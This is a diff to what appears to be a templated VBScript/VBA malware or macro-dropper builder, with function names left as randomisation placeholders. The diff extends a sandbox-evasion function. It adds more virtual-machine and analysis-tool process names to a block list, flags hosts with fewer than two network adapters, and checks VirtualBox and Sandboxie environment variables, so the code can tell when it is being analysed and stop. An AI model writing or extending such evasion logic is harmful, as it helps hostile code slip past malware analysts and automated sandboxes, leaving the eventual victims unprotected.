@@ -44,7 +44,7 @@ Function {{ v.fn_sandbox }}()
     If Screen.Width < 800 Or Screen.Height < 600 Then {{ v.fn_sandbox }} = True: Exit Function
     Dim wmi: Set wmi = GetObject("winmgmts:")
     Dim procs: Set procs = wmi.ExecQuery("SELECT Name FROM Win32_Process")
-    Dim badList: badList = Array("vmtoolsd.exe","vboxservice.exe","cuckoo.exe","qemu-ga.exe")
+    Dim badList: badList = Array("vmtoolsd.exe","vboxservice.exe","cuckoo.exe","vmsrvc.exe","qemu-ga.exe","prl_tools.exe","xenservice.exe","sandboxiedcomlaunch.exe","vmusrvc.exe")
     Dim p, j
     For Each p In procs
         Dim pn: pn = LCase(p.Name)
@@ -82,6 +82,20 @@ Function {{ v.fn_sandbox }}()
     End If
     On Error GoTo 0
     Set wmiPrt = Nothing
+    On Error Resume Next
+    Dim wmiNa As Object, naQ As Object, naCnt As Long
+    Set wmiNa = GetObject("winmgmts:")
+    If Err.Number = 0 Then
+        Set naQ = wmiNa.ExecQuery("SELECT MACAddress FROM Win32_NetworkAdapter WHERE MACAddress IS NOT NULL")
+        naCnt = 0
+        Dim oNa As Object
+        For Each oNa In naQ: naCnt = naCnt + 1: Next
+        If naCnt < 2 Then {{ v.fn_sandbox }} = True: Set wmiNa = Nothing: Exit Function
+    End If
+    On Error GoTo 0
+    Set wmiNa = Nothing
+    If Environ("VBOX_VERSION") <> "" Then {{ v.fn_sandbox }} = True: Exit Function
+    If Environ("SANDBOXIE_HOME") <> "" Then {{ v.fn_sandbox }} = True: Exit Function
 End Function
 
 Sub {{ v.sub_run }}()
